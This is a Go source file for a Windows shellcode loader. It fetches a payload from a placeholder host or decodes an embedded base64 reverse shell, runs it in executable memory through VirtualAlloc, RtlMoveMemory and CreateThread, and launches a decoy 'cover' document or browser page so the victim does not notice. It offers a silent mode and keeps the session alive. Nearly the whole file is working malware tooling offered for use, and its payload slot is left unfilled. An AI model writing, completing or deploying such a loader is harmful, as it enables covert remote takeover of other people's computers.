package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// ===== CONFIGURACIÓN HERRAMIENTA =====
const (
	REMOTE_SHELLCODE_URL = "http://mi_ip/shellcode_x64.enc"
	EMBEDDED_SHELLCODE = `Revershell en base64`
	USE_REMOTE = false  // Cambiar a true si usa URL remota
	RETRY_ATTEMPTS = 3
	RETRY_DELAY = 5 
	KEEP_ALIVE = true
	SLEEP_INTERVAL = 30
	OPEN_COVER_APP = true
	DELAY_BEFORE_COVER = 3
	SILENT_MODE = false
)

var COVER_APPLICATIONS = []string{
	"C:\\Users\\Usuario\\Desktop\\documento.pdf",
	"https://www.google.com",
	"explorer.exe"
}

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procRtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
	procSleep               = kernel32.NewProc("Sleep")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	INFINITE               = 0xFFFFFFFF
)

func logMessage(message string) {
	if !SILENT_MODE {
		fmt.Println(message)
	}
}

func checkError(err error, msg string) {
	if err != nil {
		if !SILENT_MODE {
			fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
		}
		os.Exit(1)
	}
}

func loadShellcodeFromURL(url string) []byte {
	for attempt := 1; attempt <= RETRY_ATTEMPTS; attempt++ {
		logMessage(fmt.Sprintf("[*] Attempting to download shellcode (attempt %d/%d)...", attempt, RETRY_ATTEMPTS))
		
		resp, err := http.Get(url)
		if err != nil {
			logMessage(fmt.Sprintf("[-] Attempt %d failed: %v", attempt, err))
			if attempt < RETRY_ATTEMPTS {
				logMessage(fmt.Sprintf("[*] Retrying in %d seconds...", RETRY_DELAY))
				time.Sleep(time.Duration(RETRY_DELAY) * time.Second)
				continue
			}
			checkError(err, "Failed to download shellcode after all attempts")
		}
		
		defer resp.Body.Close()
		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			logMessage(fmt.Sprintf("[-] Failed to read response body: %v", err))
			if attempt < RETRY_ATTEMPTS {
				time.Sleep(time.Duration(RETRY_DELAY) * time.Second)
				continue
			}
			checkError(err, "Failed to read shellcode response")
		}
		
		logMessage("[+] Shellcode downloaded successfully!")
		return data
	}
	return nil
}

func decodeBase64(data []byte) []byte {
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	checkError(err, "Failed to decode base64 shellcode")
	return decoded
}

func openCoverApplication() {
	if !OPEN_COVER_APP {
		return
	}

	logMessage("[*] Opening cover application...")
	time.Sleep(time.Duration(DELAY_BEFORE_COVER) * time.Second)
	for _, app := range COVER_APPLICATIONS {
		if openApplication(app) {
			logMessage(fmt.Sprintf("[+] Successfully opened cover application: %s", app))
			return
		}
	}
	
	logMessage("[-] Could not open any cover application")
}

func openApplication(appPath string) bool {
	var cmd *exec.Cmd
	
	if filepath.Ext(appPath) != "" && filepath.Ext(appPath) != ".exe" {
		cmd = exec.Command("cmd", "/c", "start", "", appPath)
	} else if len(appPath) >= 4 && appPath[:4] == "http" {
		cmd = exec.Command("cmd", "/c", "start", "", appPath)
	} else {
		cmd = exec.Command(appPath)
	}
	
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	err := cmd.Start()
	if err != nil {
		logMessage(fmt.Sprintf("[-] Failed to open %s: %v", appPath, err))
		return false
	}
	
	return true
}

func executeShellcode(shellcode []byte) {
	logMessage(fmt.Sprintf("[*] Allocating %d bytes of executable memory...", len(shellcode)))
	
	addr, _, err := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		checkError(err, "VirtualAlloc failed")
	}

	logMessage("[*] Copying shellcode to allocated memory...")
	ret, _, err := procRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	if ret == 0 {
		checkError(fmt.Errorf("RtlMoveMemory returned 0"), "Failed to copy shellcode")
	}

	logMessage("[*] Creating execution thread...")
	thread, _, err := procCreateThread.Call(
		0, 0, addr, 0, 0, 0,
	)
	if thread == 0 {
		checkError(err, "CreateThread failed")
	}

	logMessage("[+] Shellcode executed! Connection should be established...")
	
	go openCoverApplication()
	
	if KEEP_ALIVE {
		logMessage("[*] Keeping process alive for session stability...")
		for {
			time.Sleep(time.Duration(SLEEP_INTERVAL) * time.Second)
			if SLEEP_INTERVAL >= 300 && !SILENT_MODE {
				fmt.Println("[*] Session maintained...")
			}
		}
	} else {
		_, _, err = procWaitForSingleObject.Call(
			thread,
			INFINITE,
		)
	}
}

func main() {
	logMessage("[+] Starting persistent shellcode loader...")
	
	var encodedShellcode []byte
	
	if USE_REMOTE {
		logMessage(fmt.Sprintf("[*] Using remote shellcode from: %s", REMOTE_SHELLCODE_URL))
		encodedShellcode = loadShellcodeFromURL(REMOTE_SHELLCODE_URL)
	} else {
		logMessage("[*] Using embedded shellcode...")
		if EMBEDDED_SHELLCODE == "LASHELL" {
			logMessage("[-] Error: No embedded shellcode configured!")
			logMessage("[-] Please set EMBEDDED_SHELLCODE constant with your complete base64 shellcode")
			os.Exit(1)
		}
		encodedShellcode = []byte(EMBEDDED_SHELLCODE)
	}

	logMessage("[*] Decoding shellcode...")
	shellcode := decodeBase64(encodedShellcode)
	
	logMessage(fmt.Sprintf("[+] Shellcode decoded successfully (%d bytes)", len(shellcode)))
	logMessage("[!] Executing shellcode...")
	
	executeShellcode(shellcode)
}
